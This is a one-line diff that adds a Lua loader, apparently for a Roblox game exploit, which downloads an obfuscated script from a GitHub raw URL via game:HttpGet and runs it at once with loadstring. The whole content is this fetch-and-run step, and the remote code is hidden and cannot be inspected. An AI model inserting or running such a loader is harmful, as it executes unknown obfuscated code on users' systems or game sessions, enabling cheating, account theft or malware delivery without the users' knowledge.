@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/losscript/LZSCRIPT/refs/heads/main/obfuscated_script-1781418483977.lua"))()
